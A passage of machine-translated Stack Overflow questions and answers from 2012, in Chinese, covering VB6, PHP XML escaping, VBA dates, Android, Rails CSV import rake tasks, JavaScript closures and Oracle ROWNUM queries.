^[A-Za-z]{1}\d+.$*[0-9]$ 
```

• 必须以字符 az 开头（不区分大小写）

• 第一个字符必须后跟至少一个数字

• 最后一个字符必须是数字（以防止“A1234A”或“A1A”匹配）

感谢 Vladimir 和 jornak 的所有帮助。

# function - 从同一类的公共函数中调用私有函数

> ID：12461228
> 
> 赞同：0
> 
> 时间：2012-09-17T14:17:19.027
> 
> 标签：function, syntax, vb6

我有以下功能：

```
Public Function SaveExample() As Boolean 
```

&

```
Private Function ValidateExample (ByVal vlngvariable As Long) As Boolean 
```

我希望能够从第一个函数中调用第二个函数。但我得到：

“编译错误：参数不是可选的”

我正在尝试做的事情是否可行，如果可以，正确的语法是什么？我只是尝试添加该行：

```
ValidateExample 
```

第一个函数内部的一些逻辑。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:21:58.740

它与它的访问修饰符无关，它需要一个你不提供的参数，所以你需要用一个来调用它；

```
ValidateExample 1234 
```

或者让它接受一个可选参数

```
Private Function ValidateExample (Optional ByVal vlngvariable As Long = -1) As Boolean 
```

如果在没有参数的情况下调用，这将使`vlngvariable`范围内`ValidateExample`相等；`-1`

```
ValidateExample 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-17T14:21:57.197

您收到的错误消息包含解决方案：参数不是可选的。因此，您需要将值传递给函数（在我的示例中为 7）：

```
ValidateExample(7) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-17T14:22:32.723

看起来您应该为 parameter 指定一个值`vlngvariable`。

例如，在函数`SaveExample()`调用中，期望的值`ValidateExample(x)`在哪里。`x``ValidateExample`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:22:05.603

我什至不是 100% 这是哪种语言……但电话不会像

```
long vlngvariable  = 1000
Boolean result = ValidateExample(vlngvariable) 
```

该函数需要一个按值传递的参数。

# c# - 如何从 Telerik CaptchaImage 获取字节数组？

> ID：12461232
> 
> 赞同：0
> 
> 时间：2012-09-17T14:17:26.883
> 
> 标签：c#, asp.net, telerik, bytearray, captcha

我需要编写一个 http 处理程序来实例化 Telerik 验证码对象并返回验证码图像的字节数组。

这个 http 处理程序将成为另一个页面上 IMG 的源。

默认.aspx：

```
<img src="Handler1.ashx" alt="Alternate Text" /> 
```

处理程序1.ashx：

```
public class Handler1 : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        Telerik.Web.UI.CaptchaImage captchaImage = new Telerik.Web.UI.CaptchaImage();
        // How can I return captchaImage's byte array (it is not a binary image)
        context.Response.ContentType = "image/JPEG"; // ??
    }

    public bool IsReusable
    {
        get { return false; }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:33:35.797

只需在验证码中渲染图像并将其转换为字节数组。

```
using (MemoryStream ms = new MemoryStream())
{
    captchaImage.RenderImage().Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
    byte[] byteArray = ms.ToArray();
    context.Response.BinaryWrite(byteArray);
} 
```

# java - 检查客户端是否仍然连接

> ID：12461235
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:17:40.327
> 
> 标签：java, tcp

> **可能重复：**
> [Java：检测客户端与服务器端断开连接](https://stackoverflow.com/questions/5606947/java-detecting-client-disconnects-from-server-side)

检查客户端是否仍连接到服务器的最佳方法是什么？告诉我你建议的方法是如何工作的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:33:51.153

让客户端发送心跳消息。当给定长度没有收到消息时，客户端可以断开连接。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-17T14:37:03.530

> > 你的客户端是什么类型的类？如果你使用socket，有一个函数isConnected()你可以试试！

# php - xml文件中的url编码后出错

> ID：12461238
> 
> 赞同：1
> 
> 时间：2012-09-17T14:17:47.130
> 
> 标签：php, xml, urlencode, url-encoding

我创建了一个字符串

```
<?xml version='1.0' encoding='ISO-8859-1'?>
<response>
  <content>Question - aa.Reply the option corresponding to  your answer(You can vote only once)</content>
  <options>
    <option url="http://localhost/poll/index.php?message=vote%3Aaar1%3Asdy&mobile=9747444565" name="sdy"/>
    <option url="http://localhost/poll/index.php?message=vote%3Aaar1%3Ab&mobile=9747444565" name="b"/>
  </options>
</response> 
```

选项标签的 url 属性由以下 php 代码创建 `$appUrl."/poll/index.php?message=".urlencode("vote:".$kwd.":".$oopt)."&mobile=".urlencode($_GET['mobile']);`

但是当我将其转换为 xml 时，出现以下错误。

此页面包含以下错误：

第 1 行第 240 列的错误：EntityRef: Expecting ';' 下面是第一个错误之前的页面渲染。

为什么会发生这种情况。我确定这是 url 编码的问题。那么正确的 url 编码方式是什么。我的意思是应该对 url 编码应用哪些更改

```
 $appUrl."/poll/index.php?message=".urlencode("vote:".$kwd.":".$oopt)."&mobile=".urlencode($_GET['mobile']); 
```

获取参数和它们的值是 `$_GET['message'] = "vote:".$kwd.":".$oopt $_GET['mobile'] = 888888errt434`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:29:33.630

URL 中有一个未编码的`&`（和号）字符。`&`是所有基于 SGML 的标记形式中的特殊字符。

[`htmlspecialchars()`](http://php.net/manual/en/function.htmlspecialchars.php)将解决问题：

```
htmlspecialchars($appUrl."/poll/index.php?message=".urlencode("vote:".$kwd.":".$oopt)."&mobile=".urlencode($_GET['mobile'])); 
```

我个人更喜欢使用[DOM](http://uk.php.net/manual/en/book.dom.php)来创建 XML 文档而不是字符串连接。这也将正确处理 SGML 特殊字符的编码。我会做这样的事情：

```
// Create the document
$dom = new DOMDocument('1.0', 'iso-8859-1');

// Create the root node
$rootEl = $dom->appendChild($dom->createElement('response'));

// Create content node
$content = 'Question - aa.Reply the option corresponding to your answer (You can vote only once)';
$rootEl->appendChild($dom->createElement('content', $content));

// Create options container
$optsEl = $rootEl->appendChild($dom->createElement('options'));

// Add the options - data from wherever you currently get it from, this array is
// just meant as an example of the mechanism
$options = array(
  'sdy' => 'http://localhost/poll/index.php?message=vote%3Aaar1%3Asdy&mobile=9747444565',
  'b' => 'http://localhost/poll/index.php?message=vote%3Aaar1%3Ab&mobile=9747444565'
);
foreach ($options as $name => $url) {
  $optEl = $optsEl->appendChild($dom->createElement('option'));
  $optEl->setAttribute('name', $name);
  $optEl->setAttribute('url', $url);
}

// Save document to a string (you could use the save() method to write it
// to a file instead)
$xml = $dom->saveXML(); 
```

[工作示例](http://codepad.viper-7.com/1k44Bi)

# excel - VBA 日期正确收集但输出错误

> ID：12461239
> 
> 赞同：1
> 
> 时间：2012-09-17T14:17:50.143
> 
> 标签：excel, vba

我从一个电子表格中获取日期并将它们输出到另一个电子表格中。获取日期后，当我 debug.print 格式正确时。当我输出日期时，debug.print 也会显示正确的格式。但是，值刚刚发送到的电子表格上的格式未显示正确的格式。

我在用：

```
Sheets(SheetName).Cells(RowNum, ColNum).Value = Data
Sheets(SheetName).Cells(RowNum, ColNum).NumberFormat = "dd/mm/yyyy" 
```

**在**我粘贴了值之后，但是月份和日期仍然以错误的方式切换。

有什么我做错了吗？如果我右键单击单元格，它认为它的日期是 dd/mm/yyyy 但它显示的是 4 月 9 日而不是 9 月 4 日。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-02T01:20:22.860

很抱歉恢复旧帖子，但是我在 VBA 输出有效日期时遇到问题，因为美国风格，实际日期已更改，例如 5 月 1 日更改为 1 月 5 日。我遇到了这篇文章，但我没有找到我需要的答案在这里，现在我已经解决了，我想我会分享它：

关键不是将存储日期的变量定义为“日期”而是“双精度”，例如

```
Dim ReportDate As Double
ReportDate = Date

Range("E6").Value = ReportDate 
```

这是因为它输出数字“日期值”，然后在本地格式化，例如 41644 被格式化为“05/01/14”使用英国格式或“01/05/14”使用美国格式。

希望这对其他人有用（可能是我忘记了如何在六个月内解决它时的我）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:27:54.473

这可能会给本地化带来一些麻烦：

`NumberFormatLocal`如果 DanielCooks 提示没有帮助，请尝试使用;)

*编辑：*库克先生曾说过，要检查给定的数据是否正确。

*编辑：*

在我的德语版本中，我很难将其`/`用作分隔符，这就是为什么我尝试使用此代码`.NumberFormat ="dd-mm-yyyy;@"`- 工作正常；我可以随意切换日期和月份。

*编辑：*

`.NumberFormatLocal = "TT/MM/JJJJ"`我必须使用德国短裤来表示日、月和年，但现在我可以用作`/`分隔符。

您应该尝试一些格式字符串；）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-09T09:33:34.680

(1) 您需要将变量定义为“日期”类型以读取输入，然后在将其分配给日期变量之前设置日期格式。

(2) 您还需要格式化日期输出以使其正常工作！

' *****读取日期输入*******

```
Dim date1 as Date

Range("B2").NumberFormatLocal = "dd/mm/yyyy"

date1 = Range("B2").Value 
```

' *****输出日期*******

```
Range("E2").Value = date1 

Range("E2").NumberFormatLocal = "dd/mm/yyyy" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T16:09:28.833

最后我不得不将单元格格式化为“TEXT”以保持正确的格式

# java - 通过画布旋转偏离角度的旋转文本

> ID：12461241
> 
> 赞同：2
> 
> 时间：2012-09-17T14:17:53.313
> 
> 标签：java, android

我正在创建一个图表，我需要一个 y 轴的轴标题。

问题是我需要它在水平方向 -90 度。

这是我目前旋转文本的方式。

```
 paint.setTypeface(Typeface.SANS_SERIF);
    canvas.save();
    canvas.rotate(-90,15,viewHeight/2+20);
    canvas.drawText(yAxisTitle,15,viewHeight/2+20, paint);
    canvas.restore(); 
```

问题是一旦它在垂直方向上旋转它就不是直的。好像它走得太远了？

任何帮助都会很棒。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T14:34:48.117

在这种情况下，它似乎只是在模拟器上发生。在 4 台设备上测试都以正确的角度显示文本？！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-07T13:02:01.627

我的解决方案如下：我绘制背景位图，然后是文本。我不是先旋转画布然后在画布上绘制位图和文本，而是先在位图（在其画布上）上绘制文本，然后旋转画布，然后在旋转的画布上绘制位图。然后字符是直的。如果您没有背景图像，您可以创建一个透明位图，将其用作背景，然后在旋转画布之前在其上绘制文本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:48:42.223

我`onDraw()`在一个`TextView`子类中：

```
 canvas.save();
        canvas.translate(0, getHeight());
        canvas.rotate(-90);
        Layout layout = getLayout();
        if (layout != null)
            layout.draw(canvas);
        canvas.restore(); 
```

为了把文本使用`setText()`

# ruby - 在 Heroku 中下载大文件

> ID：12461242
> 
> 赞同：5
> 
> 时间：2012-09-17T14:17:53.467
> 
> 标签：ruby, heroku, download, large-files

在 Heroku 中下载大文件时，我遇到了一些问题。我必须下载和解析大于 1Gb 的文件。我现在要做的是使用 curl 将它们下载到 /tmp 文件夹（Rails 应用程序的）。

curl 命令是：“curl --retry 999 -o #{destination} #{uri} 2> /dev/null”，目标是 Rails.root.join("tmp", "file.example")

问题是几分钟下载后，下载文件的“卷曲”过程已经完成，远未完成下载。在完成之前，日志显示很多“超出内存”。这让我想到，当我保存到 /tmp 文件夹时，它会将下载的内容存储在内存中，当内存达到其限制时，进程被终止。

我想知道你们中是否有人在 Heroku 上遇到过类似的问题，以及保存到 /tmp 文件夹是否真的像这样工作。如果是这样，您对在 Heroku 进行这项工作有什么建议吗？

谢谢，埃尔维奥

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-17T14:29:10.790

最好使用雾 gem 将文件保存在 S3 等外部云提供商中。无论如何，Heroku 是一个只读文件系统，所以它们不允许你卷曲，必须少写。

# ruby-on-rails - 无法批量分配嵌套属性

> ID：12461244
> 
> 赞同：0
> 
> 时间：2012-09-17T14:17:56.583
> 
> 标签：ruby-on-rails

我检查了一些类似问题的答案，似乎都表明问题是 attr_accessible，但我似乎无法让它工作。

基本上我有用户和地址模型，并且想将地址属性分配为嵌套属性。但是当我保存它时会导致下面显示的无法批量分配属性错误。

我在下面的代码中尝试了 attr_accessible 的许多变体，例如：addresses_attributes、：address_attributes、：primary_address_attributes ...我不确定它为什么不起作用，也许是因为它在成员模块声明中？

任何人都可以帮忙吗？

```
class Member::User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
  :recoverable, :rememberable, :trackable, :validatable

  # each user may have zero or many addresses
  # their primary email is also set as their login id.
  has_many :addresses

  has_one :address, :class_name => "Member::Address", :conditions => "is_primary = true"
  accepts_nested_attributes_for :addresses, :address

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me,     :address_attributes

   validates_presence_of :email 

end 
```

我提交嵌套字段的表单（相关部分）

```
 <%= form_for(resource, :as => resource_name, :url => registration_path(resource_name), :html => {:class => "form-horizontal"}) do |f| %>
    <small>Mandatory fields marked *</small><br><br>
    <% devise_error_messages! %>
    <% flash.each do |name, msg| %>
      <div class="alert alert-<%= name == :notice ? "success" : "error" %>">
        <a class="close" data-dismiss="alert">×</a>
        <%= msg %>
      </div>
    <% end %>

    <%= f.fields_for resource.build_primary_address do |address_form| %> 
    <div class="control-group">
        <%= address_form.label :first_name, :class => "control-label" %>
        <div class="controls">
          <%= address_form.text_field :first_name, :class => "input-xlarge" %>
        </div>
      </div>

    <div class="control-group">
        <%= address_form.label :last_name, :class => "control-label" %>
        <div class="controls">
          <%= address_form.text_field :last_name, :class => "input-xlarge" %>
        </div>
      </div>
    <% end %> 
```

错误显示了这一点：

```
 Can't mass-assign protected attributes: member_address

{"utf8"=>"✓",
 "authenticity_token"=>"HrZJG2krn15veUKJVh6PgEs4wwufaeRhciHcUIn6AaM=",
 "user"=>{"member_address"=>{"first_name"=>"asdf",
 "last_name"=>"asdfsafd"},
 "email"=>"Bob.JOnes@jones.com",
 "password"=>"[FILTERED]",
 "password_confirmation"=>"[FILTERED]"}} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:56:28.987

为了让 rails 理解表单中提交的主地址是一个嵌套属性，您必须在此处明确告诉它关系：

```
<%= f.fields_for :address, resource.build_primary_address do |address_form| %> 
```

. 原因是，因为您的模型名称的范围是`Member::`，并且 rails 从类名称派生表单参数名称，所以在您的 params 哈希中，您最终会使用 :member_address 而不是 :address。因为在这种情况下 :address 是 :user 接受嵌套属性的字段，所以 :address 应该在 params 散列中表示为 :address_attributes ，因此请确保后者出现在 attr_accessible 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:21:18.227

添加

```
attr_accessible :member_address 
```

到用户模型。

说明：您要用来初始化 ActiveRecord 实例的每个哈希键都必须声明为 attr_accessible。查看您的哈希键有：

```
 "user"=>{"member_address"=>{ ... }} 
```

初始化 User 实例的哈希中的 member_address 键，因此它必须包含在 attr_accessible 语句中。

# eclipse - Eclipse 编辑器自定义颜色

> ID：12461247
> 
> 赞同：0
> 
> 时间：2012-09-17T14:18:02.257
> 
> 标签：eclipse, colors

![在此处输入图像描述](../Images/9e259be1a933ec5dd545220bc7396eba.png)

在我的 Eclipse IDE Indigo Release 中，匹配括号的颜色设置不正确，我看不到括号中标签“ `<div class=...>`”的文本，所以我想更改它，有一个“Eclipse_Theme.epf”文件我导入 Eclipse 来设置自定义颜色，之前我使用过以下方法来更改要替换的颜色：

```
[1] Take a screen shot of the Eclipse editor
[2] Paste the screen into a window's painter program
[3] Use the color picker to pick the color I want to change
[4] Find it's RGB values, e.g. 10,20,255
[5] In "Eclipse_Theme.epf" search for the RBG value and replace them with my new RGB choice, save the file
[6] Import "Eclipse_Theme.epf" into Eclipse again to replace the old one, and the new color will show up in my Eclipse editor. 
```

但是上述方法对上述问题不起作用，在“Eclipse_Theme.epf”文件中找不到匹配括号的颜色，我的问题是，它在 Eclipse 中的哪个位置，我可以更改此颜色，或者“Eclipse_Theme.epf”文件中哪个属性代表这种颜色，为什么找不到？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:28:03.897

根据您使用的技术（JSF、HTML 等），尝试 Window->Preferences->Web->HTML->Editor->Syntax Coloring 或类似的东西。另一种可能性是 Window->Preferences->General->Editors->Text Editors->Annotations

# android - Android Wifi 信号强度

> ID：12461253
> 
> 赞同：4
> 
> 时间：2012-09-17T14:18:24.027
> 
> 标签：android, android-wifi

我想通过 wifi 扫描获取可用路由器的列表、它们的 SSID 和信号强度。你能帮我看看代码吗？

PS：我是安卓新手。一个相关的例子将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:25:58.803

下面的代码用于获取 SSID、BSSID、IP 地址和 RSSI...

```
WifiManager wifi = = (WifiManager) uMobility.getContext().getSystemService(Context.WIFI_SERVICE);    

String ssid = wifi.getConnectionInfo().getSSID(); // for geting SSID
String bssid = wifi.getConnectionInfo().getBSSID(); // for geting BSSID
int ipAddress = wifi.getConnectionInfo().getIpAddress(); // for geting IP Address
int rssi = wifi.getConnectionInfo().getRssi(); // for geting RSSI 
```

# pdf - Monotouch：从泄漏整个文档大小的 PDF 生成 UIImage

> ID：12461254
> 
> 赞同：1
> 
> 时间：2012-09-17T14:18:24.717
> 
> 标签：pdf, memory-leaks, xamarin.ios, uiimage

在 Monotouch 应用程序中，以下代码将页面从 PDF 文档转换为 UIImage。它可以工作，但不能正确处理 PDF 文档。

```
public class KillerLeak
{
    public static void RunOnce()
    {
        using (CGPDFDocument doc = CGPDFDocument.FromFile("DMSWorkbook.pdf"))
        {
            Console.WriteLine("Opened: pages={0}", doc.Pages);

            UIImage img = GetThumbImage(doc, 1000, 1);
            img.Dispose();
        }

        GC.Collect(GC.MaxGeneration);
        GC.WaitForPendingFinalizers();
    }

    private static UIImage GetThumbImage(CGPDFDocument document, float thumbContentSize, int pageNumber)
    {
        if ((pageNumber <= 0) || (pageNumber > document.Pages)) {
            return null;
        }

        // Calc page view size
        SizeF pageSize = new SizeF(768, 1024);
        if (pageSize.Width % 2 > 0) {
            pageSize.Width--;
        }
        if (pageSize.Height % 2 > 0) {
            pageSize.Height--;
        }

        // Calc target size 
        var targetSize = new Size((int)pageSize.Width, (int)pageSize.Height);

        // Draw page on CGImage
        CGImage pageImage;
        using (CGColorSpace rgb = CGColorSpace.CreateDeviceRGB()) {
            using (CGBitmapContext context = new CGBitmapContext(null, targetSize.Width, targetSize.Height, 8, 0, rgb, CGBitmapFlags.ByteOrder32Little | CGBitmapFlags.NoneSkipFirst)) {
                using (CGPDFPage pdfPage = document.GetPage(pageNumber)) {
                    RectangleF thumbRect = new RectangleF(0.0f, 0.0f, targetSize.Width, targetSize.Height);
                    context.SetFillColor(1.0f, 1.0f, 1.0f, 1.0f);
                    context.FillRect(thumbRect);
                    context.ConcatCTM(pdfPage.GetDrawingTransform(CGPDFBox.Crop, thumbRect, 0, true));
                    context.SetRenderingIntent(CGColorRenderingIntent.Default);
                    context.InterpolationQuality = CGInterpolationQuality.Default;
                    context.DrawPDFPage(pdfPage);
                    pageImage = context.ToImage();
                }
            }
        }           
        UIImage result = UIImage.FromImage(pageImage);  
        pageImage.Dispose();
        return result;          
    }
} 
```

如果我注释掉 DrawPDFPage(...) 行，则代码不会泄漏。这是一个 Monotouch 错误还是我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T13:47:28.070

事实证明，泄漏与我之前认为的 Monotouch 无关。**在 IOS 5上不会**发生泄漏，但在仍处于测试阶段的下一个 IOS 版本下会发生泄漏。我已经使用用 Monotouch 和 Objective-C 编写的相同代码进行了测试，它们都表现出相同的行为。

# xpages - Typeahead 是否在 formTable 中工作？

> ID：12461256
> 
> 赞同：0
> 
> 时间：2012-09-17T14:18:27.850
> 
> 标签：xpages

我有一个自定义控件，它使用一个 formTable 控件，其中有一个 formColumn 控件，formColumn 控件中有 3 个 formRow 控件，每个 formRow 控件中有一个 editBox 控件。我正在尝试让 Typeahead 处理 editBox 控件。这些用于城市、州和邮政编码，Typeahead 使用名为 ZIPCodesByCity 的视图。第 1 列包含城市，第 2 列包含州，第 3 列包含邮政编码。

这是我的城市编辑框建议部分的公式：

```
@Unique(@DbColumn(@DbName()),"ZIPCodesByCity",1) 
```

预输入中的最小字符数设置为 1，并且未选中区分大小写。

当我预览 xpage 时，Typeahead 不起作用。

有任何想法吗？

乔丹

好的，我将代码编辑为如下，它仍然无法正常工作。

```
@Unique(@DbColumn(@DbName(),"ZIPCodesByCity",1)) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T15:22:08.073

Even though I've done it too many times to count, I find that often with DbColumn and Dblookup it's easy to overlook the simple basics:

Have you looked at the ajax response from the typeahead in Firebug to see what is being returned?

Have you tested the DbColumn in a computedField to see what is returned?

Is it possible your DbColumn is exceeding 64k?

Are there any readers fields on the documents in the target view?

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T08:09:50.330

公式中存在类型错误：其中一个括号定位错误。它应该是：

```
@Unique(@DbColumn(@DbName(),"ZIPCodesByCity",1)); 
```

在您的公式中，在 @DbName() 调用之后有一个额外的 ) 。

# ruby-on-rails - 如何通过 rake 任务导入 CSV 文件？

> ID：12461260
> 
> 赞同：21
> 
> 时间：2012-09-17T14:18:44.450
> 
> 标签：ruby-on-rails, rake, import-from-csv

我知道这个问题在这个论坛上被问了很多，但我在一个严格的期限内，我需要一些帮助，所以任何建议都非常感谢。我是 Ruby on Rails 的新手，所以在回复时请记住这一点。我想创建一个 rake 任务，它在运行时会更新 mysqlite db 中的多个表。这是一个迁移文件，它在我的数据库中创建了一个新事件。如何创建将通过 CSV 文件输入所有这些信息的 rake 任务。有人可以帮助我从头到尾编写 rake 文件吗？显然您不需要为每个字符串编写每个任务，只需举几个例子。除了实际的 rake 文件之外，我是否需要向我的应用程序的任何其他部分添加代码（我知道这是一个非常笼统的问题，但如果我确实需要添加代码，我会很感激对位置的一般描述）。我觉得会有一点指导。如果有人需要我提供更多信息，请询问。

```
class CreateIncidents < ActiveRecord::Migration
  def self.up
    create_table :incidents do |t|
      t.datetime :incident_datetime
      t.string :location
      t.string :report_nr
      t.string :responsible_party
      t.string :area_resident
      t.string :street
      t.string :city
      t.string :state
      t.string :home_phone
      t.string :cell_phone
      t.string :insurance_carrier_name
      t.string :insurance_carrier_street
      t.string :insurance_carrier_city
      t.string :insurance_carrier_state
      t.string :insurance_carrier_phone
      t.string :insurance_carrier_contact
      t.string :policy_nr
      t.string :vin_nr
      t.string :license_nr
      t.string :vehicle_make
      t.string :vehicle_model
      t.string :vehicle_year

      t.timestamps
    end
  end

  def self.down
    drop_table :incidents
  end
end 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-09-17T14:25:02.710

在 lib/task 的项目文件夹下创建一个 rake 文件，例如“import_incidents_csv.rake”

按照这个 [Ruby on Rails - 从 CSV 文件导入数据](https://stackoverflow.com/questions/4410794/ruby-on-rails-import-data-from-a-csv-file)

在 rake 文件中有以下代码

```
require 'csv'
namespace :import_incidents_csv do
  task :create_incidents => :environment do
    "code from the link"  
  end
end 
```

您可以将此任务称为“rake import_incidents_csv:create_incidents”

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-12-20T12:41:13.413

我一天为此工作了好几个小时。我终于通过执行以下操作使其工作：

1.  在我的 csv 文件的第一行中添加了一个标题，该标题反映`attr_accessible`在我的模型中。在我的情况下，我的模型是`attr_accessible` `:intro`，`:name`在我的 csv 文件中，第一行读取名称，介绍。
2.  创建了一个自定义 rake 文件。我命名了我的 import.rake 并将其放在 lib/tasks 文件夹中。将此代码放在该文件中：

> ```
> #lib/tasks/import.rake
> require 'csv'
> desc "Imports a CSV file into an ActiveRecord table"
> task :import, [:filename] => :environment do    
>     CSV.foreach('myfile.csv', :headers => true) do |row|
>       MyModel.create!(row.to_hash)
>     end
> end 
> ```

然后`bundle exec rake import`在命令行中输入。

为了让它工作，我有相当的 SQLite 数据库浏览器。我希望对某人有所帮助！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-18T01:38:49.103

这是我使用 rake db:seed 导入的示例 CSV。我把它写到了seeds.rb 文件中，然后把CSV 文件放到了/public/seed_data/zip_code.csv 中。这很容易解释（即 csv 有三列：代码、长列和纬度。

代码解析每一行，提取相关数据并将其分配给局部变量，然后将其写入记录。希望能帮助到你。

```
File.open("#{Rails.root}/public/seed_data/zip_code.csv") do |zip_codes|
  zip_codes.read.each_line do |zip_code|
    code, longitude, latitude = zip_code.chomp.split(",")
    #  to remove the quotes from the csv text:
    code.gsub!(/\A"|"\Z/, '')
    # to create each record in the database
    ZipCodeGeo.create!(:zip_code => code, :longitude => longitude, :latitude =>      latitude)             
  end
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T10:29:13.253

您可以使用`CSV`rails 模块读取 csv 文件并创建记录。这是详细的帮助：[使用 csv 填充数据库](http://tech-brains.blogspot.in/2012/12/how-to-populate-database-using-data.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-10-09T23:40:07.100

我过去用过这个。它需要任何类型的模型。

# rake csv_model_import[bunnies.csv,Bunny]

奇迹般有效。

```
desc "Imports a CSV file into an ActiveRecord table"
task :csv_model_import, :filename, :model, :needs => :environment do |task,args|
  lines = File.new(args[:filename]).readlines
  header = lines.shift.strip
  keys = header.split(',')
  lines.each do |line|
    params = {}
    values = line.strip.split(',')
    keys.each_with_index do |key,i|
      params[key] = values[i]
    end
    Module.const_get(args[:model]).create(params)
  end
end
```

# javascript - 带功能的 setTimeout

> ID：12461261
> 
> 赞同：1
> 
> 时间：2012-09-17T14:18:48.630
> 
> 标签：javascript

我正在尝试创建一个书签来打开带有特定文本的链接，但我遇到了该`setTimeout`部分的问题......

```
javascript:(function(){
    function clickLink(link) {
        if (document.createEvent) {
            var event=document.createEvent("MouseEvents"); 
            event.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
            link.dispatchEvent(event);
        } else if (link.fireEvent) {
            link.fireEvent("onclick");
        }
    } 

    l=document.links;
    for(var i=0;i<l.length;++i) {
        var lL=l[i].innerHTML.toLowerCase(); 
        if(lL.indexOf("click here")!=-1 || lL.indexOf("how")!=-1) 
             setTimeout(function() {clickLink(l[i]) }, 1000);
        }
    }; 
})(); 
```

如果我尝试`setTimeout(clickLink(l[i]), 1000);`，那么它可以工作，但它会立即运行而不是等待超时！

还想知道以这种方式单击链接会触发 mousedown/mouseup 事件的另一件事？如果不是，那么我如何以编程方式单击也会触发 mousedown/mouseup 事件的链接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:27:00.730

您遇到了通常的“lambda 中的循环变量”问题：到超时完成时，`i`将超过. 您可以将该部分包装在一个（另一个）函数中：`document.links``l[i]``undefined`

```
(function(item) {
    setTimeout(function() { clickLink(item); }, 1000);
})(l[i]); 
```

# api - 如何从 Spotify API 获取 Allmusic 信息？

> ID：12461263
> 
> 赞同：2
> 
> 时间：2012-09-17T14:18:53.713
> 
> 标签：api, spotify

他们的搜索 API 文档表明 AMG 和 MusicBrainz ids/uris 在响应中返回：[https ://developer.spotify.com/technologies/web-api/search/](https://developer.spotify.com/technologies/web-api/search/)

但是，当前对其示例 API 调用的响应似乎忽略了这些数据： [http ://ws.spotify.com/search/1/track?q=foo](http://ws.spotify.com/search/1/track?q=foo)

我是不是理解不正确，还是他们只是忘记更新他们的文档？

我检查了他们的支持页面，它让我去堆栈溢出来问我的问题： [https ://developer.spotify.com/support/](https://developer.spotify.com/support/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T16:43:50.480

对于匹配的内容，AMG 和 Musicbrainz 的 id 之前就在那里（但并非所有内容都匹配）。现在所有的 id 似乎都不见了。你理解正确。文档很糟糕。

由于这是一个 API 问题，因此这是正确的论坛。

# oracle - 休眠oracle rownum问题

> ID：12461265
> 
> 赞同：4
> 
> 时间：2012-09-17T14:18:56.113
> 
> 标签：oracle, hibernate

```
SELECT * FROM ( 
   select * 
   from tableA 
   where ColumnA = 'randomText' 
   ORDER BY columnL ASC 
) WHERE ROWNUM <= 25 
```

在执行此查询时，由于 Oracle 的一些优化，查询大约需要 14 分钟才能执行。如果我删除 where 子句，查询将在几秒钟内执行。表的大多数列都有索引，包括上面提到的那些。当我使用休眠时，我对查询的结构没有太大的灵活性。

此查询也立即返回结果，结果正确：

```
SELECT * 
FROM ( 
   select * 
   from tableA, 
        dual 
   where ColumnA = 'randomText' 
   ORDER BY columnL ASC
) WHERE ROWNUM <= 25 
```

有什么我可以做的，使用休眠？

更新：我使用 EntityManager.createQuery()，也使用 setMaxResults(25) 和 setFirstResult()。上面的查询是hibernate查询的样子，观察日志

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T04:33:58.983

我没有得到与您的查询完全匹配的解释计划，但似乎 oracle 对这两个查询使用了不同的索引。

你能创建一个包含`columnA`and的索引`columnL`吗？

如果您有一个仅包含 的索引`columnA`，您可能可以删除它而不会对其他查询的性能产生很大影响。

另一种方法是添加提示以使用更快查询中使用的索引。但这需要您使用本机 sql。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-09-17T14:22:22.120

这意味着您正在使用hibernate/jpa？如果是这样，我猜您正在使用`EntityManager.createNativeQuery()`来创建查询？尝试删除您的 where-restriction 并改用`.setMaxResults(25)`on `Query`。

无论如何，你为什么需要外部选择？不会

```
select * 
from tableA 
where ColumnA = 'randomText' 
AND ROWNUM <= 25
ORDER BY columnL ASC 
```

产生预期的结果？

# java - 跟踪已经看到的对象

> ID：12461274
> 
> 赞同：2
> 
> 时间：2012-09-17T14:19:24.930
> 
> 标签：java, object

